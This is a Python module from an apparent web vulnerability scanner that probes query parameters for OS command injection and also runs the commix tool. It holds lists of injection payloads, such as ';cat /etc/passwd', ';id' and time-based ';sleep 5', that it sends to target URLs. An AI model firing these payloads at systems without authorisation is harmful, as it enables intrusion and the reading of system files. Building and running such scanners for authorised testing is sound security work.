import requests
import re
import os
import time
import subprocess
import threading
import logging
from urllib.parse import urlparse, urljoin
from sqlalchemy.exc import IntegrityError
from tools.database import Vulnerability # Import the Vulnerability model

# Define colors for console output
RED = '\033[0;31m'
GREEN = '\033[0;32m'
YELLOW = '\033[0;33m'
BLUE = '\033[0;34m'
MAGENTA = '\033[0;35m'
CYAN = '\033[0;36m'
NC = '\033[0m'
BOLD = '\033[1m'

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Function to read URLs from a file
def read_urls_from_file(file_path):
    try:
        with open(file_path, 'r') as file:
            urls = [line.strip() for line in file if line.strip()]
        return urls
    except FileNotFoundError:
        print(f"{RED}[!] Error: URLs file not found at {file_path}{NC}")
        return []

# Function to execute a command and capture output (for general use)
def run_command_capture_output(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, check=False) # check=False because external tools might exit with non-zero on no findings
        return result.stdout.strip(), result.stderr.strip(), result.returncode
    except Exception as e:
        print(f"{RED}An unexpected error occurred during command execution: {e}{NC}")
        return "", str(e), 1

# Test for simple command injection
def test_simple_injection(url, session, scan_id):
    print(f"{BLUE}[*] Testing simple command injection for: {url}{NC}")
    parsed_url = urlparse(url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
    query_params = parsed_url.query

    if not query_params:
        logger.info(f"Skipping {url}: No query parameters found for simple injection test.")
        return

    params = {}
    for param_pair in query_params.split('&'):
        if '=' in param_pair:
            key, value = param_pair.split('=', 1)
            params[key] = value
        else:
            params[param_pair] = '' # Handle parameters without values

    injection_payloads = [
        ";ls", ";ls -la", ";cat /etc/passwd", ";id", "&&ls", "&&id",
        "|ls", "|id", "`ls`", "$ (ls)",
        "%0a/bin/ls", "%0a`ls`", # URL encoded newlines for parameter injection
        "|whoami", "`whoami`", "||whoami", "&&whoami"
    ]

    for param_name, original_value in params.items():
        for payload in injection_payloads:
            test_value = f"{original_value}{payload}"
            test_params = params.copy()
            test_params[param_name] = test_value
            
            test_url = base_url + "?" + "&".join([f"{k}={v}" for k, v in test_params.items()])

            try:
                response = requests.get(test_url, timeout=5)
                # Check for common command output patterns in the response
                if re.search(r'root:x:0:0:|bin|usr|var|home|etc|proc|dev|tmp', response.text, re.IGNORECASE) or \
                   re.search(r'uid=|gid=|groups=', response.text, re.IGNORECASE):
                    
                    vuln_data = {
                        "vulnerability": "Command Injection (Simple)",
                        "severity": "high",
                        "url": test_url,
                        "parameter": param_name,
                        "payload": payload,
                        "response_snippet": response.text[:500] # Store a snippet of the response
                    }

                    try:
                        new_vulnerability = Vulnerability(
                            scan_id=scan_id,
                            vulnerability_data=vuln_data,
                            vulnerability_type=vuln_data["vulnerability"],
                            severity=vuln_data["severity"],
                            url=vuln_data["url"]
                        )
                        session.add(new_vulnerability)
                        session.commit()
                        print(f"{GREEN}   [+] Command Injection (Simple) found at: {test_url} with payload '{payload}'{NC}")
                        return # Found one, move to next URL
                    except IntegrityError:
                        session.rollback()
                        logger.info(f"Duplicate Command Injection (Simple) vulnerability found and skipped for URL: {test_url}")
                    except Exception as db_e:
                        session.rollback()
                        logger.error(f"Error saving Command Injection (Simple) vulnerability to DB: {db_e}")
            except requests.exceptions.RequestException as e:
                logger.debug(f"Request failed for {test_url}: {e}")
            except Exception as e:
                logger.error(f"Error during simple injection test for {test_url}: {e}")

# Test for time-based command injection
def test_time_based_injection(url, session, scan_id):
    print(f"{BLUE}[*] Testing time-based command injection for: {url}{NC}")
    parsed_url = urlparse(url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
    query_params = parsed_url.query

    if not query_params:
        logger.info(f"Skipping {url}: No query parameters found for time-based injection test.")
        return

    params = {}
    for param_pair in query_params.split('&'):
        if '=' in param_pair:
            key, value = param_pair.split('=', 1)
            params[key] = value
        else:
            params[param_pair] = '' # Handle parameters without values

    sleep_payloads = [
        ";sleep 5", "&&sleep 5", "|sleep 5",
        "$(sleep 5)", "`sleep 5`",
        "%0asleep%205" # URL encoded
    ]
    
    # Threshold for time-based detection
    delay_threshold = 4.5 # seconds

    for param_name, original_value in params.items():
        for payload in sleep_payloads:
            test_value = f"{original_value}{payload}"
            test_params = params.copy()
            test_params[param_name] = test_value
            
            test_url = base_url + "?" + "&".join([f"{k}={v}" for k, v in test_params.items()])

            start_time = time.time()
            try:
                response = requests.get(test_url, timeout=10) # Set a longer timeout for sleep payloads
                end_time = time.time()
                elapsed_time = end_time - start_time

                if elapsed_time >= delay_threshold:
                    vuln_data = {
                        "vulnerability": "Command Injection (Time-Based)",
                        "severity": "high",
                        "url": test_url,
                        "parameter": param_name,
                        "payload": payload,
                        "delay_detected_seconds": f"{elapsed_time:.2f}"
                    }

                    try:
                        new_vulnerability = Vulnerability(
                            scan_id=scan_id,
                            vulnerability_data=vuln_data,
                            vulnerability_type=vuln_data["vulnerability"],
                            severity=vuln_data["severity"],
                            url=vuln_data["url"]
                        )
                        session.add(new_vulnerability)
                        session.commit()
                        print(f"{GREEN}   [+] Command Injection (Time-Based) found at: {test_url} with payload '{payload}' (Delay: {elapsed_time:.2f}s){NC}")
                        return # Found one, move to next URL
                    except IntegrityError:
                        session.rollback()
                        logger.info(f"Duplicate Command Injection (Time-Based) vulnerability found and skipped for URL: {test_url}")
                    except Exception as db_e:
                        session.rollback()
                        logger.error(f"Error saving Command Injection (Time-Based) vulnerability to DB: {db_e}")
            except requests.exceptions.Timeout:
                # If timeout occurs, it might indicate successful injection if it's the expected delay
                end_time = time.time()
                elapsed_time = end_time - start_time
                if elapsed_time >= delay_threshold:
                    vuln_data = {
                        "vulnerability": "Command Injection (Time-Based - Timeout)",
                        "severity": "high",
                        "url": test_url,
                        "parameter": param_name,
                        "payload": payload,
                        "delay_detected_seconds": f"{elapsed_time:.2f}"
                    }
                    try:
                        new_vulnerability = Vulnerability(
                            scan_id=scan_id,
                            vulnerability_data=vuln_data,
                            vulnerability_type=vuln_data["vulnerability"],
                            severity=vuln_data["severity"],
                            url=vuln_data["url"]
                        )
                        session.add(new_vulnerability)
                        session.commit()
                        print(f"{GREEN}   [+] Command Injection (Time-Based - Timeout) found at: {test_url} with payload '{payload}' (Delay: {elapsed_time:.2f}s){NC}")
                        return
                    except IntegrityError:
                        session.rollback()
                        logger.info(f"Duplicate Command Injection (Time-Based - Timeout) vulnerability found and skipped for URL: {test_url}")
                    except Exception as db_e:
                        session.rollback()
                        logger.error(f"Error saving Command Injection (Time-Based - Timeout) vulnerability to DB: {db_e}")
            except requests.exceptions.RequestException as e:
                logger.debug(f"Request failed for {test_url}: {e}")
            except Exception as e:
                logger.error(f"Error during time-based injection test for {test_url}: {e}")

def run_commix(urls_file_path, output_dir, session, scan_id):
    print(f"{YELLOW}[+] Running Commix for deeper command injection scanning...{NC}")

    if not os.path.exists(urls_file_path):
        print(f"{RED}[!] URLs file not found at {urls_file_path}. Skipping Commix scan.{NC}")
        return

    # Check if commix is installed
    stdout, stderr, returncode = run_command_capture_output("command -v commix")
    if returncode != 0:
        print(f"{RED}[!] Commix is not installed or not in PATH. Please install it to use advanced command injection scanning. Skipping.{NC}")
        return

    # Commix can take a list of URLs from a file using -m
    # It typically outputs to stdout. We'll capture stdout and parse it.
    # Commix also supports --batch for automated execution without user interaction.
    
    commix_command = f"commix -m {urls_file_path} --batch --output-dir {output_dir}"
    
    stdout, stderr, returncode = run_command_capture_output(commix_command)
    
    print(f"{GREEN}[+] Commix scan completed for URLs in {urls_file_path}{NC}")
    
    # Simple parsing of commix output for demonstration.
    potential_vulns = []
    # Regex to find potential vulnerabilities mentioned in commix output
    vuln_patterns = [
        r"vulnerable to (command injection)",
        r"possible command injection found at (.*?)\n",
        r"parameter '(.*?)' is vulnerable"
    ]

    for line in stdout.splitlines():
        line_lower = line.lower()
        if "vulnerable" in line_lower or "injection found" in line_lower:
            url_match = re.search(r"http[s]?://[^\s]+", line)
            vuln_url = url_match.group(0) if url_match else "Unknown URL (from commix output)"
            
            payload_match = re.search(r"payload: '(.*?)'", line)
            payload = payload_match.group(1) if payload_match else "N/A"

            # Attempt to extract parameter if mentioned
            param_match = re.search(r"parameter '(.*?)' is vulnerable", line)
            parameter = param_match.group(1) if param_match else "N/A"

            # Basic categorization
            vuln_type = "Command Injection (Commix)"
            severity = "high"

            vuln_data = {
                "vulnerability": vuln_type,
                "severity": severity,
                "url": vuln_url,
                "tool": "Commix",
                "commix_output_line": line, # Store the raw line for context
                "parameter": parameter,
                "payload": payload
            }
            potential_vulns.append(vuln_data)
    
    if session and scan_id is not None:
        for vuln in potential_vulns:
            try:
                new_vulnerability = Vulnerability(
                    scan_id=scan_id,
                    vulnerability_data=vuln,
                    vulnerability_type=vuln["vulnerability"],
                    severity=vuln["severity"],
                    url=vuln["url"]
                )
                session.add(new_vulnerability)
                session.commit()
                print(f"{GREEN}   [+] Command Injection (Commix) stored for: {vuln['url']}{NC}")
            except IntegrityError:
                session.rollback()
                logger.info(f"Duplicate Commix Command Injection vulnerability found and skipped for URL: {vuln['url']}")
            except Exception as db_e:
                session.rollback()
                logger.error(f"Error saving Commix Command Injection vulnerability to DB: {db_e}")
    else:
        print(f"{YELLOW}[!] Session or scan_id not provided. Commix results not stored in database.{NC}")
    
    print(f"{GREEN}[+] Commix scan results processed.{NC}")

# Main command injection function
def commandinjection(urls_file_path, output_dir, session=None, scan_id=None):
    """
    Performs command injection testing on URLs from a given file.
    Results are stored in the database.
    """
    print(f"{YELLOW}[+] Starting Command Injection scan...{NC}")
    
    urls = read_urls_from_file(urls_file_path)
    if not urls:
        print(f"{RED}[!] No URLs found to test for Command Injection.{NC}")
        return

    # Use ThreadPoolExecutor for concurrent testing
    max_threads = 5 # Limit threads for this specific test to avoid overwhelming the target/rate limits
    
    threads = []
    for url in urls:
        t1 = threading.Thread(target=test_simple_injection, args=(url, session, scan_id))
        t2 = threading.Thread(target=test_time_based_injection, args=(url, session, scan_id))
        threads.append(t1)
        threads.append(t2)
        t1.start()
        t2.start()

    for t in threads:
        t.join() # Wait for all threads to complete

    # Run Commix after the custom tests
    run_commix(urls_file_path, output_dir, session, scan_id)

    print(f"{GREEN}[+] Command Injection scan completed. Results stored in database.{NC}")

# This part is for direct testing of the module
if __name__ == "__main__":
    # This is for testing purposes only. In production, this is called from VulnScanX.py.
    # You would need to set up a dummy session and scan_id for testing.
    from tools.database import init_db, get_session, Base, ScanHistory # For local testing

    # Initialize a temporary database for testing
    temp_db_engine = init_db('sqlite:///test_command_injection_with_commix.db')
    test_session = get_session(temp_db_engine)
    
    # Create a dummy ScanHistory record for testing
    test_domain = "test-ci-target-with-commix.com"
    test_scan = test_session.query(ScanHistory).filter_by(domain=test_domain).first()
    if not test_scan:
        test_scan = ScanHistory(domain=test_domain)
        test_session.add(test_scan)
        test_session.commit()
    test_scan_id = test_scan.id

    dummy_output_dir = "test_ci_output_with_commix"
    os.makedirs(dummy_output_dir, exist_ok=True)
    dummy_urls_file = os.path.join(dummy_output_dir, "dummy_urls_ci_commix.txt")
    
    # Create a dummy urls.txt file for testing (example vulnerable URLs)
    with open(dummy_urls_file, "w") as f:
        f.write("http://testphp.vulnweb.com/redir.php?url=test\n") # Placeholder, might not be vulnerable
        f.write("http://testhtml5.vulnweb.com/welcome.php?name=test\n") # Another placeholder
        # For actual testing, you would point to a known vulnerable lab like bWAPP, DVWA, etc.
        # Example of a URL that might be vulnerable to time-based:
        # f.write("http://localhost/bWAPP/command_injection.php?target=ping&ip=127.0.0.1%3Bsleep%205\n") 
        # (Requires bWAPP setup)
        f.write("http://example.com/?param=value\n") # A benign URL for testing

    print(f"{BLUE}[+] Running Command Injection test with commix integration...{NC}")
    commandinjection(dummy_urls_file, dummy_output_dir, session=test_session, scan_id=test_scan_id)
    
    print(f"{BLUE}[+] Verifying results from database...{NC}")
    retrieved_vulns = test_session.query(Vulnerability).filter_by(scan_id=test_scan_id).all()
    for vuln in retrieved_vulns:
        print(f"   Vulnerability Found: {vuln.vulnerability_type} at {vuln.url} (Severity: {vuln.severity})")
        print(f"     Full Data: {vuln.vulnerability_data}")

    test_session.close()
    
    # Clean up test files and directory
    if os.path.exists(dummy_urls_file):
        os.remove(dummy_urls_file)
    
    try:
        if os.path.exists(dummy_output_dir) and not os.listdir(dummy_output_dir):
            os.rmdir(dummy_output_dir)
        else:
            print(f"{YELLOW}[!] Directory {dummy_output_dir} not empty, skipping rmdir.{NC}")
    except OSError as e:
        print(f"{RED}Error removing directory {dummy_output_dir}: {e}{NC}")
    
    # Clean up test database file
    if os.path.exists('test_command_injection_with_commix.db'):
        os.remove('test_command_injection_with_commix.db')

    print(f"{GREEN}[+] Command Injection test with Commix completed.{NC}")